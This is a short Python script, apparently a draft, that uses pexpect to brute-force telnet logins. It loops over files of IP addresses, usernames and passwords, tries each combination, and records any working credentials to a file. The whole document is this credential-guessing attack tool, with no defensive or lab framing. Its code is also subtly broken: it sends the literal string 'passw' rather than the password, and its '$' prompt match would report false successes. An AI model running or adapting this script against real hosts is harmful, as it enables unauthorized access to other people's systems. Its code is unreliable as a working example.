import pexpect
import time # for sleep for the login denial
import sys

# a file to put it in. When these all get combined make it one file?
f1 = open('./text2', 'w+')

# get the ips, users, and passwords from the file
ip = [line.rstrip('\n') for line in open('ip.txt')]
usr = [line.rstrip('\n') for line in open('users.txt')]
pw = [line.rstrip('\n') for line in open('passwords.txt')]

#this will need to read in from a file of ip addresses
for k in ip :
    telip = 'telnet ' + str(k)

    # username list 
    for l in usr :
        name = str(l)
	
	# I get four tries at a password
        count = 1
        # password list 
        for m in pw :
            passw = str(m)
            # Start the process to connect
#try here
            try:
                child = pexpect.spawn(telip)
	    # if we connect we get ------------------ BUT if it's refused 
                child.expect(':', timeout=5)
                child.sendline(name)
                child.expect('Password:')
                child.sendline('passw')

	    # we'll either get a prompt or back to login. I get four tries
                i = child.expect(['$',' login:'])
		# were in.
                if i == 0 :
                    print('Connected')
                    f1.write('CONNECTED IP: ' + telip + ' USER: ' + name + ' PASSWORD ' + passw + '\n')
                    child.sendline('logout')
                elif i == 1 :
                    print('login failed')
            #increase count, if we're at 5 then we need to reconnect
                count += 1
                if count == 5 :
                    time.sleep(2)
                    child = pexpect.spawn(telip)
                    count = 1
                
	# excepts here
            except(pexpect.EOF):
                print("Connection refused")
            except(pexpect.TIMEOUT):
                print("Connection timed out")
            
            
f1.close()
